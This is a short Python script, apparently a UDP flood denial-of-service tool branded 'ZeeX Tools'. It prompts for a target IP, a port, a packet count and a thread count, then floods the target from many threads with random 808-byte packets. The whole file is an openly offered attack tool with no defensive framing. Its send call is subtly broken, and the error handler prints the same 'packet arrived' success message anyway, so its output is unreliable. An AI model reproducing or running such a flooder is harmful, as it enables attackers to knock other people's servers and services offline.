import random
import socket
import threading
import os,sys

os.system("clear")
print("""\033[92m
  _____        __  __     _____    
 |__  /___  ___\ \/ /   _|__  /____
   / // _ \/ _ \\  / | | | / /|_  /
  / /|  __/  __//  \ |_| |/ /_ / / 
 /____\___|\___/_/\_\__, /____/___|
                    |___/  """)
print("==========================")
print("=       ZeeX Tools       =")
print("=    Made By : ZeeXyZDos =")
print("=          DD0S          =")
print("=     ZeeX Attack Samp   =")
print("==========================")
print(" Comunity : https://discord.gg/y6FEe4nfc4   ")
print(" YouTube : Dark ZeeX      ")

ip = str(input("\033[95mDark DDOS | \033[93mHOST/IP ====> : \033[91m"))
port = int(input("\033[95mDark DDOS | \033[93mPORT ====> : \033[91m"))
times = int(input("\033[95mDark DDOS | \033[93mPAKET ====> : \033[91m"))
threads = int(input("\033[95mDark DDOS | \033[93mTHREAD ====> : \033[91m"))
os.system("clear")
def run():
    data = random._urandom(808)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.send(data,addr)
            print(f"ATTACK IP >>> \033[1;96m{ip}:{port} \033[1;91m >> PAKET SUDAH SAMPAI")
        except:
            print(f"ATTACK IP >>> \033[1;96m{ip}:{port} \033[1;91m >> PAKET SUDAH SAMPAI")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()